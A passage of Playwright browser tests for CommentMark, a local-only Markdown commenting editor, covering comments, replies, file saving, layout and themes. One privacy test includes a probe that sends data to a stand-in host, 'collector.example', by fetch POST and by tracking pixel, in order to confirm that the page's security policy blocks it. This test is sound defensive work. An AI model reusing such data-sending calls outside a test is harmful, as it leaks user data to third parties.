/**
 * Real-browser smoke tests against the production build (`vite preview`).
 * Every check of what the editor wrote goes through `@commentmark/core`'s
 * parser, reading the source from the Source view or a downloaded file.
 */
import {readFile} from 'node:fs/promises'
import {expect, test, type Page} from '@playwright/test'
import {maintain, parse, POINTER} from '@commentmark/core'

/** Select `needle` (inside one text node) in the rendered document. */
async function selectText(page: Page, needle: string) {
  await page.evaluate((needle) => {
    const body = document.querySelector('.doc-body')!
    const walker = document.createTreeWalker(body, NodeFilter.SHOW_TEXT)
    for (let node = walker.nextNode(); node; node = walker.nextNode()) {
      const at = (node as Text).data.indexOf(needle)
      if (at < 0) continue
      const range = document.createRange()
      range.setStart(node, at)
      range.setEnd(node, at + needle.length)
      const selection = window.getSelection()!
      selection.removeAllRanges()
      selection.addRange(range)
      return
    }
    throw new Error(`Text not found: ${needle}`)
  }, needle)
}

/** The current source, as shown by the read-only Source view. */
async function readSource(page: Page): Promise<string> {
  await page.getByRole('button', {name: 'Source', exact: true}).click()
  const source = await page.getByTestId('source').evaluate((el) => el.textContent ?? '')
  await page.getByRole('button', {name: 'Document', exact: true}).click()
  return source
}

function collectErrors(page: Page): string[] {
  const errors: string[] = []
  page.on('pageerror', (error) => errors.push(String(error)))
  page.on('console', (message) => {
    if (message.type() === 'error') errors.push(message.text())
  })
  return errors
}

const margin = (page: Page) => page.locator('.margin')
const draftBox = (page: Page) => page.getByTestId('draft')

/** Viewport top of the current browser selection. */
const selectionTop = (page: Page) => page.evaluate(() => window.getSelection()!.getRangeAt(0).getClientRects()[0]!.top)

test('select, comment, reply, resolve, undo, redo, download', async ({page}) => {
  const errors = collectErrors(page)
  await page.goto('./')
  await expect(page.locator('.doc-body h1')).toHaveText('Welcome to CommentMark')
  const initialThreads = parse(await readSource(page)).threads.length

  // New comment on a selection.
  await selectText(page, 'Select a phrase on this page')
  // The box appears beside the selection by itself.
  const box = margin(page).getByTestId('draft')
  await box.getByRole('textbox').click()
  await box.getByRole('textbox').fill('Is *this* the first step?')
  await box.getByRole('button', {name: 'Comment', exact: true}).click()

  // First write asks for the author once.
  const dialog = page.getByRole('dialog', {name: 'Your name on comments'})
  await expect(dialog).toBeVisible()
  await dialog.getByRole('textbox').fill('tester')
  await dialog.getByRole('button', {name: 'Use @tester'}).click()
  await dialog.getByRole('button', {name: 'Save'}).click()
  await expect(dialog).toBeHidden()

  const card = margin(page).locator('.thread.is-focused')
  await expect(card).toContainText('Is this the first step?')
  await expect(card.locator('em')).toHaveText('this')
  await expect(page.locator('mark.sm-hl.is-focused')).toHaveText('Select a phrase on this page')
  await expect(page.getByTestId('save-state')).toHaveText('Unsaved changes')

  let doc = parse(await readSource(page))
  expect(doc.threads.length).toBe(initialThreads + 1)
  const created = doc.threads.find((t) => t.comments[0]?.author === '@tester')!
  expect(created.attachment).toMatchObject({kind: 'anchored', via: 'anchors', text: 'Select a phrase on this page'})
  const id = created.id

  // Reply.
  await page.locator(`mark[data-threads~="${id}"]`).first().click()
  const focused = margin(page).locator(`.thread[data-thread="${id}"]`)
  await focused.getByRole('textbox', {name: 'Reply'}).fill('Yes, and pipes | are escaped.')
  await focused.getByRole('button', {name: 'Reply', exact: true}).click()
  await expect(focused.locator('.comment')).toHaveCount(2)

  // Resolve: hidden by default.
  await focused.getByRole('button', {name: 'Resolve'}).click()
  await expect(margin(page).locator(`.thread[data-thread="${id}"]`)).toHaveCount(0)
  await expect(page.locator(`mark[data-threads~="${id}"]`)).toHaveCount(0)

  // Undo the resolve.
  await page.getByRole('button', {name: 'Undo'}).click()
  await expect(margin(page).locator(`.thread[data-thread="${id}"]`)).toHaveCount(1)

  doc = parse(await readSource(page))
  let thread = doc.threads.find((t) => t.id === id)!
  expect(thread.state).toBe('open')
  expect(thread.comments.map((c) => [c.author, c.comment, c.status.raw])).toEqual([
    ['@tester', 'Is *this* the first step?', ''],
    ['@tester', 'Yes, and pipes | are escaped.', '']
  ])
  expect(thread.comments[1]!.commentSource).toBe('Yes, and pipes \\| are escaped.')

  // Redo brings the resolve back.
  await page.keyboard.press('ControlOrMeta+Shift+Z')
  doc = parse(await readSource(page))
  thread = doc.threads.find((t) => t.id === id)!
  expect(thread.state).toBe('resolved')
  expect(thread.comments).toHaveLength(3)

  // Save: the sample has no file handle, so it downloads. maintain() runs first.
  const downloading = page.waitForEvent('download')
  await page.getByRole('button', {name: 'Download'}).click()
  const download = await downloading
  expect(download.suggestedFilename()).toBe('commentmark-sample.md')
  const saved = await readFile((await download.path())!, 'utf8')
  expect(maintain(saved)).toBe(saved)
  const savedDoc = parse(saved)
  expect(savedDoc.strayAnchors).toHaveLength(0)
  expect(savedDoc.threads.find((t) => t.id === id)?.state).toBe('resolved')
  await expect(page.getByTestId('save-state')).toHaveText('Saved')

  expect(errors).toEqual([])
})

test('open a file, edit, delete, document-level comment, purge', async ({page}) => {
  const errors = collectErrors(page)
  await page.addInitScript(() => localStorage.setItem('commentmark.author', '@robot'))
  await page.goto('./')

  const source = [
    '# Notes',
    '',
    'Alpha <a id="c-aaaaa1"></a>beta<a id="c-aaaaa1-end"></a> gamma.',
    '',
    '## Comments',
    '',
    '| Ref | Quote | Author | Date | Comment | Status |',
    '|---|---|---|---|---|---|',
    '| [c-aaaaa1](#c-aaaaa1) | Alpha **beta** gamma. | @a | 2026-11-17T10:00Z | First | |',
    '| [c-aaaaa1](#c-aaaaa1) | | @b | 2026-11-17T10:05Z | Second | |',
    '| [c-gone01](#c-gone01) | **vanished words** | @a | 2026-11-17T10:00Z | Lost | |',
    '| [c-done01](#c-done01) | | @a | 2026-11-17T10:00Z | Old | resolved |',
    ''
  ].join('\r\n')
  await page.getByTestId('file-input').setInputFiles({name: 'notes.md', mimeType: 'text/markdown', buffer: Buffer.from(source)})
  await expect(page.locator('.file-name')).toHaveText('notes.md')
  await expect(page.locator('.doc-body')).toContainText('Alpha beta gamma.')

  // Detached group shows the quote.
  const detached = page.locator('section', {has: page.getByRole('heading', {name: /Detached/})})
  await expect(detached).toContainText('vanished words')

  // Edit the root comment.
  await page.locator('mark[data-threads~="c-aaaaa1"]').first().click()
  const card = margin(page).locator('.thread[data-thread="c-aaaaa1"]')
  await card.locator('.comment').first().getByRole('button', {name: 'Edit'}).click()
  await card.getByRole('textbox', {name: 'Edit comment'}).fill('First, edited')
  await card.getByRole('button', {name: 'Save'}).click()
  await expect(card.locator('.comment').first()).toContainText('First, edited')

  // Delete the root comment (in-page confirmation); the reply becomes the root.
  await card.locator('.comment').first().getByRole('button', {name: 'Delete'}).click()
  await card.locator('.inline-confirm').getByRole('button', {name: 'Delete'}).click()
  await expect(card.locator('.comment')).toHaveCount(1)

  let doc = parse(await readSource(page))
  let thread = doc.threads.find((t) => t.id === 'c-aaaaa1')!
  expect(thread.comments.map((c) => c.comment)).toEqual(['Second'])
  expect(thread.quote?.quote).toBe('beta')
  expect(doc.source.includes('\r\n')).toBe(true)
  expect(/[^\r]\n/.test(doc.source)).toBe(false)

  // Document-level comment.
  await page.getByRole('button', {name: 'Add a comment'}).click()
  await page.getByRole('textbox', {name: 'New comment on the whole document'}).fill('Overall fine.')
  await page.locator('.doc-composer-dock .composer').getByRole('button', {name: 'Comment', exact: true}).click()
  await expect(page.locator('.doc-comments')).toContainText('Overall fine.')

  // Purge: choose only the detached threads.
  await page.getByRole('button', {name: 'Purge…'}).click()
  const purge = page.getByRole('dialog', {name: 'Purge threads'})
  await expect(purge).toContainText('Resolved threads (1)')
  await expect(purge).toContainText('Detached threads (their text is gone) (1)')
  await purge.getByRole('checkbox', {name: /Resolved threads/}).uncheck()
  await purge.getByRole('button', {name: 'Delete 1 thread'}).click()

  doc = parse(await readSource(page))
  expect(doc.threads.map((t) => [t.id, t.attachment.kind, t.state])).toEqual([
    ['c-aaaaa1', 'anchored', 'open'],
    ['c-done01', 'document', 'resolved'],
    [expect.stringMatching(/^c-[0-9a-z]{6}$/), 'document', 'open']
  ])

  // Delete the whole anchored thread: rows and anchors go.
  await page.locator('mark[data-threads~="c-aaaaa1"]').first().click()
  await card.getByRole('button', {name: 'Delete thread'}).click()
  await card.locator('.inline-confirm').getByRole('button', {name: 'Delete thread'}).click()
  doc = parse(await readSource(page))
  expect(doc.threads.some((t) => t.id === 'c-aaaaa1')).toBe(false)
  expect(doc.anchors).toHaveLength(0)

  expect(errors).toEqual([])
})

test('a selection core cannot anchor shows an in-page message', async ({page}) => {
  await page.addInitScript(() => localStorage.setItem('commentmark.author', '@robot'))
  await page.goto('./')
  const source = '# T\n\nSome text.\n\n## Discussion\n\n| Ref | Quote | Author | Date | Comment | Status |\n|---|---|---|---|---|---|\n| c-1 | | @a | | Hi | |\n'
  await page.getByTestId('file-input').setInputFiles({name: 't.md', mimeType: 'text/markdown', buffer: Buffer.from(source)})
  // The heading above the table is shown but is not part of the body (§6.2).
  await selectText(page, 'Discussion')
  // The refusal shows where the comment box would be, instead of an input.
  await expect(draftBox(page)).toContainText('can’t be commented on')
  await expect(draftBox(page).getByRole('textbox')).toHaveCount(0)
  // A valid selection gets a box again.
  await selectText(page, 'Some text')
  await expect(draftBox(page).getByRole('textbox')).toBeVisible()
})

test('phone width: threads and the comment box dock at the bottom', async ({browser}) => {
  const page = await browser.newPage({viewport: {width: 390, height: 844}})
  await page.addInitScript(() => localStorage.setItem('commentmark.author', '@phone'))
  await page.goto('./')
  await expect(page.locator('.margin')).toHaveCount(0)
  await page.locator('mark[data-threads~="c-intro1"]').first().click()
  const sheet = page.getByRole('region', {name: 'Comment panel'})
  await expect(sheet).toContainText('This is the whole idea')
  await sheet.getByRole('button', {name: 'Close'}).click()
  await expect(sheet).toHaveCount(0)

  // Selecting text docks the comment box, without taking focus.
  await selectText(page, 'sidecar file')
  await expect(sheet.getByTestId('draft')).toBeVisible()
  expect(await page.evaluate(() => window.getSelection()!.toString())).toBe('sidecar file')
  await sheet.getByRole('textbox', {name: 'New comment'}).fill('From a phone.')
  await sheet.getByRole('button', {name: 'Comment', exact: true}).click()
  await expect(sheet).toHaveCount(0)
  const doc = parse(await readSource(page))
  expect(doc.threads.find((t) => t.comments[0]?.author === '@phone')?.attachment).toMatchObject({text: 'sidecar file'})
  await page.close()
})

test('keyboard: threads are reachable with Tab and show focus', async ({page}) => {
  await page.goto('./')
  const first = margin(page).locator('.thread').first()
  await first.focus()
  await expect(first).toHaveClass(/is-focused/)
  await expect(page.locator('mark.sm-hl.is-focused').first()).toBeVisible()
})

/** Viewport point at the left (or right) edge of the first occurrence of `needle`. */
async function textPoint(page: Page, needle: string, edge: 'left' | 'right') {
  return page.evaluate(
    ({needle, edge}) => {
      const body = document.querySelector('.doc-body')!
      const walker = document.createTreeWalker(body, NodeFilter.SHOW_TEXT)
      for (let node = walker.nextNode(); node; node = walker.nextNode()) {
        const at = (node as Text).data.indexOf(needle)
        if (at < 0) continue
        const range = document.createRange()
        const index = edge === 'left' ? at : at + needle.length - 1
        range.setStart(node, index)
        range.setEnd(node, index + 1)
        const rect = range.getBoundingClientRect()
        return {x: edge === 'left' ? rect.left + 1 : rect.right - 1, y: rect.top + rect.height / 2}
      }
      throw new Error(`Text not found: ${needle}`)
    },
    {needle, edge}
  )
}

test('mouse: drag-select across list items and comment', async ({page}) => {
  await page.addInitScript(() => localStorage.setItem('commentmark.author', '@mouse'))
  await page.goto('./')
  await page.locator('.doc-body ol').scrollIntoViewIfNeeded()
  const from = await textPoint(page, 'Reply to a thread', 'left')
  const to = await textPoint(page, 'Switch to', 'right')
  await page.mouse.move(from.x, from.y)
  await page.mouse.down()
  await page.mouse.move((from.x + to.x) / 2, (from.y + to.y) / 2, {steps: 5})
  await page.mouse.move(to.x, to.y, {steps: 5})
  await page.mouse.up()
  await draftBox(page).getByRole('textbox').click()
  await page.keyboard.type('Two steps in one.')
  await page.keyboard.press('ControlOrMeta+Enter')
  const doc = parse(await readSource(page))
  const thread = doc.threads.find((t) => t.comments[0]?.author === '@mouse')!
  expect(thread.attachment).toMatchObject({kind: 'anchored', text: 'Reply to a thread, resolve it, then press Undo. Switch to'})
  const marks = page.locator(`mark[data-threads~="${thread.id}"]`)
  await expect(marks).toHaveCount(2)
})

test('mouse: double-click a word and comment', async ({page}) => {
  await page.addInitScript(() => localStorage.setItem('commentmark.author', '@mouse'))
  await page.goto('./')
  const word = await textPoint(page, 'sidecar', 'left')
  await page.mouse.dblclick(word.x + 4, word.y)
  await expect(draftBox(page)).toBeVisible()
  // Ctrl/⌘+Alt+M moves into the box.
  await page.keyboard.press('ControlOrMeta+Alt+KeyM')
  await expect(draftBox(page).getByRole('textbox')).toBeFocused()
  await page.keyboard.type('Define this?')
  await page.keyboard.press('ControlOrMeta+Enter')
  const doc = parse(await readSource(page))
  const thread = doc.threads.find((t) => t.comments[0]?.author === '@mouse')!
  expect(thread.attachment).toMatchObject({kind: 'anchored', text: 'sidecar'})
})

test('File System Access: open with a handle, save in place, detect changes on disk', async ({page}) => {
  await page.addInitScript(() => {
    const disk = {content: '﻿# Disk\n\nSaved in place.\n', lastModified: 1000, writes: 0}
    ;(window as unknown as {__disk: typeof disk}).__disk = disk
    const handle = {
      kind: 'file',
      name: 'disk.md',
      async getFile() {
        return new File([disk.content], 'disk.md', {lastModified: disk.lastModified})
      },
      async queryPermission() {
        return 'granted'
      },
      async requestPermission() {
        return 'granted'
      },
      async createWritable() {
        const parts: string[] = []
        return {
          async write(data: Blob | string) {
            // Decode keeping a BOM, so the test sees the exact bytes written.
            const bytes = typeof data === 'string' ? new TextEncoder().encode(data) : await data.arrayBuffer()
            parts.push(new TextDecoder('utf-8', {ignoreBOM: true}).decode(bytes))
          },
          async close() {
            disk.content = parts.join('')
            disk.lastModified += 1
            disk.writes++
          }
        }
      }
    }
    ;(window as unknown as {showOpenFilePicker: () => Promise<unknown[]>}).showOpenFilePicker = async () => [handle]
    localStorage.setItem('commentmark.author', '@disk')
  })
  await page.goto('./')
  await page.getByRole('toolbar').getByRole('button', {name: 'Open'}).click()
  await expect(page.locator('.file-name')).toHaveText('disk.md')
  await expect(page.getByRole('button', {name: 'Save', exact: true})).toBeVisible()

  await selectText(page, 'in place')
  await draftBox(page).getByRole('textbox').click()
  await page.keyboard.type('Nice.')
  await page.keyboard.press('ControlOrMeta+Enter')
  await page.keyboard.press('ControlOrMeta+S')
  await expect(page.getByTestId('save-state')).toHaveText('Saved')

  const disk = () => page.evaluate(() => (window as unknown as {__disk: {content: string; writes: number}}).__disk)
  let written = await disk()
  expect(written.writes).toBe(1)
  // Bytes outside the edit are untouched, including the byte order mark.
  expect(written.content.startsWith('﻿# Disk\n\nSaved <a id="c-')).toBe(true)
  expect(parse(written.content).threads[0]).toMatchObject({attachment: {kind: 'anchored', text: 'in place'}})

  // Another program changes the file: saving asks first.
  await page.evaluate(() => {
    ;(window as unknown as {__disk: {lastModified: number}}).__disk.lastModified += 500
  })
  await page.locator('mark.sm-hl').first().click()
  await page.getByRole('textbox', {name: 'Reply'}).fill('Second thoughts.')
  await page.getByRole('button', {name: 'Reply', exact: true}).click()
  await page.getByRole('button', {name: 'Save', exact: true}).click()
  const dialog = page.getByRole('dialog', {name: 'The file changed on disk'})
  await expect(dialog).toBeVisible()
  await dialog.getByRole('button', {name: 'Overwrite'}).click()
  await expect(page.getByTestId('save-state')).toHaveText('Saved')
  written = await disk()
  expect(written.writes).toBe(2)
  expect(parse(written.content).threads[0]!.comments).toHaveLength(2)
})

test('drag and drop a file; unsaved changes are confirmed in-page first', async ({page}) => {
  await page.addInitScript(() => localStorage.setItem('commentmark.author', '@drop'))
  await page.goto('./')
  // Make the sample dirty.
  await page.getByRole('button', {name: 'Add a comment'}).click()
  await page.keyboard.type('Pending.')
  await page.keyboard.press('ControlOrMeta+Enter')
  await expect(page.getByTestId('save-state')).toHaveText('Unsaved changes')

  const data = await page.evaluateHandle(() => {
    const transfer = new DataTransfer()
    transfer.items.add(new File(['# Dropped\n\nHello from a drop.\n'], 'dropped.md', {type: 'text/markdown'}))
    return transfer
  })
  await page.dispatchEvent('body', 'dragenter', {dataTransfer: data})
  await page.dispatchEvent('body', 'drop', {dataTransfer: data})
  const dialog = page.getByRole('dialog', {name: 'Discard unsaved changes?'})
  await expect(dialog).toBeVisible()
  await dialog.getByRole('button', {name: 'Discard and open'}).click()
  await expect(page.locator('.file-name')).toHaveText('dropped.md')
  await expect(page.locator('.doc-body')).toContainText('Hello from a drop.')
  await expect(page.getByTestId('save-state')).toHaveText('Saved')
})

test('comment box: appears on selection, follows it, disappears, survives focus, keeps drafts', async ({page}) => {
  await page.addInitScript(() => localStorage.setItem('commentmark.author', '@sel'))
  await page.goto('./')
  const box = margin(page).getByTestId('draft')
  const boxTop = async () => (await box.boundingBox())!.y
  await expect(box).toHaveCount(0)

  // Appears beside the selection, without taking focus: the selection stays.
  await selectText(page, 'There is no server')
  await expect(box).toBeVisible()
  await expect.poll(async () => Math.abs((await boxTop()) - (await selectionTop(page)))).toBeLessThan(4)
  expect(await page.evaluate(() => document.activeElement?.tagName)).toBe('BODY')
  expect(await page.evaluate(() => window.getSelection()!.toString())).toBe('There is no server')

  // Follows a new selection.
  await selectText(page, 'Code blocks are commented on')
  await expect(box).toHaveCount(1)
  await expect.poll(async () => Math.abs((await boxTop()) - (await selectionTop(page)))).toBeLessThan(4)

  // Disappears when the selection is cleared without using the box.
  await page.evaluate(() => window.getSelection()!.removeAllRanges())
  await expect(box).toHaveCount(0)

  // Focusing the box keeps it and highlights the range instead of the selection.
  await selectText(page, 'Threads can overlap')
  await box.getByRole('textbox').click()
  await expect(page.locator('mark[data-threads~="pending"]')).toHaveText('Threads can overlap')
  expect(await page.evaluate(() => window.getSelection()!.toString())).toBe('')
  // A click elsewhere in the document does not remove a focused box.
  const elsewhere = await textPoint(page, 'Code blocks are', 'left')
  await page.mouse.click(elsewhere.x + 10, elsewhere.y)
  await expect(box).toBeVisible()

  // Draft text is never thrown away by clicks or new selections.
  await box.getByRole('textbox').fill('Half-written thought')
  await page.mouse.click(elsewhere.x + 10, elsewhere.y)
  await selectText(page, 'There is no server')
  await page.waitForTimeout(200)
  await expect(box).toHaveCount(1)
  await expect(box.getByRole('textbox')).toHaveValue('Half-written thought')
  await expect(page.locator('mark[data-threads~="pending"]')).toHaveText('Threads can overlap')

  // Escape in the box discards it.
  await box.getByRole('textbox').press('Escape')
  await expect(box).toHaveCount(0)
  await expect(page.locator('mark[data-threads~="pending"]')).toHaveCount(0)

  // Cancel discards too.
  await selectText(page, 'There is no server')
  await box.getByRole('textbox').click()
  await box.getByRole('button', {name: 'Cancel'}).click()
  await expect(box).toHaveCount(0)

  // Keyboard focus (not a click) also engages the box.
  await selectText(page, 'There is no server')
  await expect(box).toBeVisible()
  await box.getByRole('textbox').focus()
  await page.keyboard.type('Typed after tabbing in.')
  await page.keyboard.press('ControlOrMeta+Enter')
  const doc = parse(await readSource(page))
  expect(doc.threads.find((t) => t.comments[0]?.comment === 'Typed after tabbing in.')?.attachment).toMatchObject({text: 'There is no server'})
})

test('layout: wider document, whole-document comments on top, getting-started note', async ({page}) => {
  await page.setViewportSize({width: 1280, height: 900})
  await page.goto('./')
  // 820px document beside a 300px margin at a 1280px laptop width.
  expect((await page.locator('.doc-body').boundingBox())!.width).toBe(820)
  await expect(page.locator('.margin')).toBeVisible()

  // Whole-document comments sit above the body.
  const order = await page.evaluate(() => {
    const comments = document.querySelector('.doc-comments')!
    const body = document.querySelector('.doc-body')!
    return comments.compareDocumentPosition(body) & Node.DOCUMENT_POSITION_FOLLOWING
  })
  expect(order).toBeTruthy()
  await expect(page.locator('.doc-comments')).toContainText('Feedback on the sample as a whole')

  // The getting-started note explains drag and drop, and stays dismissed.
  const intro = page.getByRole('complementary', {name: 'Getting started'})
  await expect(intro).toContainText('drop it anywhere on this page')
  await intro.getByRole('button', {name: 'Got it'}).click()
  await expect(intro).toHaveCount(0)
  await page.reload()
  await expect(page.locator('.doc-body h1')).toBeVisible()
  await expect(intro).toHaveCount(0)

  // With no whole-document threads, only a compact entry point shows.
  const source = '# Plain\n\nNo comments yet.\n'
  await page.getByTestId('file-input').setInputFiles({name: 'plain.md', mimeType: 'text/markdown', buffer: Buffer.from(source)})
  await expect(page.locator('.doc-comments.is-empty')).toBeVisible()
  await expect(page.locator('.doc-comments .thread')).toHaveCount(0)
  await expect(page.locator('.doc-comments').getByRole('button', {name: 'Add a comment'})).toBeVisible()
})

test('local only: nothing leaves the device while opening, commenting and saving', async ({page, baseURL}) => {
  const origin = new URL(baseURL!).origin
  const traffic: Array<{url: string; method: string; body: string}> = []
  page.on('request', (request) => traffic.push({url: request.url(), method: request.method(), body: request.postData() ?? ''}))
  page.on('websocket', (socket) => traffic.push({url: socket.url(), method: 'WEBSOCKET', body: ''}))
  const failed: Array<{url: string; error: string}> = []
  const completed: string[] = []
  page.on('requestfailed', (request) => failed.push({url: request.url(), error: request.failure()?.errorText ?? ''}))
  page.on('requestfinished', (request) => completed.push(request.url()))
  await page.addInitScript(() => {
    localStorage.setItem('commentmark.author', '@private')
    const seen: string[] = []
    ;(window as unknown as {__blocked: string[]}).__blocked = seen
    document.addEventListener('securitypolicyviolation', (event) => seen.push(`${event.effectiveDirective} ${event.blockedURI}`))
  })
  await page.goto('./')

  // A document whose text must never appear in any request, with a remote
  // image (a classic "tracking pixel") and an ordinary link.
  const marker = `PRIVATE-${Date.now().toString(36)}`
  const source = [
    '# Confidential plan',
    '',
    `The ${marker} launch is on the fifth.`,
    '',
    '![Team photo](https://images.example.com/team.png?doc=secret)',
    '',
    'Background is on [the site](https://example.com/).',
    ''
  ].join('\n')
  await page.getByTestId('file-input').setInputFiles({name: 'plan.md', mimeType: 'text/markdown', buffer: Buffer.from(source)})
  await expect(page.locator('.doc-body h1')).toHaveText('Confidential plan')

  // The remote image is a placeholder, not an <img>.
  await expect(page.locator('.sm-image-placeholder')).toContainText('Image: Team photo')
  await expect(page.locator('.doc-body img')).toHaveCount(0)
  await expect(page.getByRole('note')).toContainText('1 remote image')

  // Comment, reply and save (download).
  await selectText(page, `${marker} launch`)
  await draftBox(page).getByRole('textbox').click()
  await page.keyboard.type(`Comment-${marker}`)
  await page.keyboard.press('ControlOrMeta+Enter')
  await page.getByRole('textbox', {name: 'Reply'}).fill(`Reply-${marker}`)
  await page.getByRole('button', {name: 'Reply', exact: true}).click()
  const downloading = page.waitForEvent('download')
  await page.getByRole('button', {name: 'Download'}).click()
  const saved = await readFile((await (await downloading).path())!, 'utf8')
  expect(saved).toContain(`Comment-${marker}`)
  expect(saved).toContain(`Reply-${marker}`)

  // Everything the app itself did: every request stayed on the page's own
  // origin (or was a local data:/blob: URL), all GETs for the page's files.
  const appTraffic = [...traffic]
  const external = appTraffic.filter((r) => !r.url.startsWith(`${origin}/`) && !/^(data|blob):/.test(r.url))
  expect(external).toEqual([])
  expect(appTraffic.every((r) => r.method === 'GET')).toBe(true)
  // And no request carried the document's text or the comments.
  const leaks = appTraffic.filter((r) => `${r.url} ${r.body}`.includes(marker) || `${r.url} ${r.body}`.includes('Confidential'))
  expect(leaks).toEqual([])
  console.log(`local-only: ${appTraffic.length} requests, all GET to ${origin}: ${appTraffic.map((r) => new URL(r.url).pathname).join(', ')}`)

  // The policy is enforced by the browser, not just by our code: a script
  // that tried to send data out would be blocked.
  const attempt = await page.evaluate(async () => {
    const image = new Image()
    image.src = 'https://collector.example/pixel.png?leak=1'
    try {
      await fetch('https://collector.example/leak', {method: 'POST', body: 'leak'})
      return 'sent'
    } catch {
      return 'blocked'
    }
  })
  expect(attempt).toBe('blocked')
  await expect
    .poll(() => page.evaluate(() => (window as unknown as {__blocked: string[]}).__blocked))
    .toEqual(expect.arrayContaining([expect.stringMatching(/^connect-src https:\/\/collector\.example/), expect.stringMatching(/^img-src https:\/\/collector\.example/)]))
  // Chromium reports the blocked image as a request that failed before it
  // reached the network; nothing to collector.example ever completed.
  expect(completed.filter((url) => url.includes('collector.example'))).toEqual([])
  for (const request of traffic.slice(appTraffic.length)) {
    expect(failed.find((f) => f.url === request.url)?.error, request.url).toMatch(/BLOCKED_BY_CSP|csp/i)
  }
  console.log(`local-only probe: ${JSON.stringify(failed)}`)
})

test('local only: the statement is always visible and explains itself', async ({page}) => {
  await page.goto('./')
  const badge = page.getByRole('button', {name: /Local only/})
  await expect(badge).toBeVisible()
  await badge.click()
  const panel = page.getByRole('region', {name: 'Local only'})
  await expect(panel).toContainText('The contents of your Markdown file and your edits never leave this device.')
  await panel.getByRole('button', {name: 'Close'}).click()
  await expect(panel).toHaveCount(0)
  // The first-open note leads with it.
  const intro = page.getByRole('complementary', {name: 'Getting started'})
  await expect(intro.locator('.intro-title')).toHaveText('Private: your files stay on this device')
  await expect(intro).toContainText('never leave this device')
  // The badge stays after the note is dismissed.
  await intro.getByRole('button', {name: 'Got it'}).click()
  await expect(badge).toBeVisible()
  // The built page carries the strict policy.
  const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content')
  expect(policy).toContain("connect-src 'none'")
  expect(policy).toContain("img-src 'self' data: blob:")
})

test('theme: the toggle switches between light and dark and is remembered', async ({page}) => {
  const errors = collectErrors(page)
  await page.emulateMedia({colorScheme: 'light'})
  await page.goto('./')
  const toggle = page.getByTestId('theme-toggle')
  const background = () => page.evaluate(() => getComputedStyle(document.body).backgroundColor)
  // With no choice made, the page follows the system and pins nothing.
  await expect(page.locator('html')).not.toHaveAttribute('data-theme', /.+/)
  await expect(toggle).toHaveAccessibleName('Switch to dark theme')
  const light = await background()

  await toggle.click()
  await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark')
  await expect(toggle).toHaveAccessibleName('Switch to light theme')
  const dark = await background()
  expect(dark).not.toBe(light)

  // The choice survives a reload and wins over the system setting.
  await page.reload()
  await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark')
  expect(await background()).toBe(dark)

  await page.getByTestId('theme-toggle').click()
  await expect(page.locator('html')).toHaveAttribute('data-theme', 'light')
  expect(await background()).toBe(light)
  expect(errors).toEqual([])
})

test('theme: follows a dark system setting until a choice is made', async ({page}) => {
  await page.emulateMedia({colorScheme: 'dark'})
  await page.goto('./')
  await expect(page.getByTestId('theme-toggle')).toHaveAccessibleName('Switch to light theme')
  const dark = await page.evaluate(() => getComputedStyle(document.body).backgroundColor)
  await page.emulateMedia({colorScheme: 'light'})
  await expect(page.getByTestId('theme-toggle')).toHaveAccessibleName('Switch to dark theme')
  expect(await page.evaluate(() => getComputedStyle(document.body).backgroundColor)).not.toBe(dark)
})

test('whole-document comment box stays in view while the document scrolls', async ({page}) => {
  const errors = collectErrors(page)
  await page.setViewportSize({width: 1280, height: 620})
  await page.goto('./')
  await page.getByRole('button', {name: 'Add a comment'}).click()
  const box = page.getByRole('textbox', {name: 'New comment on the whole document'})
  await box.fill('Started at the top')

  await page.evaluate(() => window.scrollTo(0, 700))
  await expect.poll(() => page.evaluate(() => window.scrollY)).toBeGreaterThan(600)
  await expect(box).toBeInViewport({ratio: 1})
  await expect(box).toBeFocused()
  // It sits below the sticky toolbar, not under it.
  const toolbarBottom = await page.locator('.toolbar').evaluate((el) => el.getBoundingClientRect().bottom)
  const dockTop = await page.locator('.doc-composer-dock').evaluate((el) => el.getBoundingClientRect().top)
  expect(dockTop).toBeGreaterThanOrEqual(toolbarBottom)

  await page.keyboard.type(', finished further down.')
  await expect(box).toHaveValue('Started at the top, finished further down.')
  await page.getByRole('article', {name: 'New comment on the whole document'}).getByRole('button', {name: 'Comment', exact: true}).click()
  const dialog = page.getByRole('dialog', {name: 'Your name on comments'})
  await dialog.getByRole('textbox').fill('@tester')
  await dialog.getByRole('button', {name: 'Save'}).click()
  await expect(page.locator('.doc-composer-dock')).toHaveCount(0)
  const doc = parse(await readSource(page))
  expect(doc.threads.some((t) => t.attachment.kind === 'document' && t.comments[0]?.comment === 'Started at the top, finished further down.')).toBe(true)
  expect(errors).toEqual([])
})

test('about: the editor links back to the project on GitHub', async ({page}) => {
  await page.goto('./')
  const repo = 'https://github.com/waynepan/commentmark'
  const about = page.getByRole('link', {name: 'About', exact: true})
  const links = [
    page.getByRole('link', {name: 'CommentMark', exact: true}),
    about,
    page.getByRole('complementary', {name: 'Getting started'}).getByRole('link', {name: 'Read about the project on GitHub'})
  ]
  for (const link of links) {
    await expect(link).toBeVisible()
    await expect(link).toHaveAttribute('href', repo)
    await expect(link).toHaveAttribute('target', '_blank')
    await expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  }
  // The toolbar link stays after the note is dismissed.
  await page.getByRole('button', {name: 'Got it'}).click()
  await expect(about).toBeVisible()
})

test('pointer: the first comment on a file writes the pointer to the spec, hidden in the document view', async ({page}) => {
  const errors = collectErrors(page)
  await page.goto('./')
  const source = '# Plan\n\nShip the migration in the third quarter.\n'
  await page.getByTestId('file-input').setInputFiles({name: 'plan.md', mimeType: 'text/markdown', buffer: Buffer.from(source)})
  await expect(page.locator('.file-name')).toHaveText('plan.md')
  await selectText(page, 'third quarter')
  const box = draftBox(page)
  await box.getByRole('textbox').click()
  await box.getByRole('textbox').fill('Which month?')
  await box.getByRole('button', {name: 'Comment', exact: true}).click()
  const dialog = page.getByRole('dialog', {name: 'Your name on comments'})
  await dialog.getByRole('textbox').fill('@tester')
  await dialog.getByRole('button', {name: 'Save'}).click()
  await expect(margin(page)).toContainText('Which month?')

  // The raw file carries the pointer directly above the heading.
  const written = await readSource(page)
  expect(written).toContain(`\n\n${POINTER}\n\n## Comments\n\n| Ref |`)
  expect(written.startsWith('# Plan\n\nShip the migration in the ')).toBe(true)
  const doc = parse(written)
  expect(doc.table?.pointer).not.toBeNull()

  // The rendered document shows neither the pointer, the heading nor the table.
  const body = page.locator('.doc-body')
  await expect(body).not.toContainText('CommentMark:')
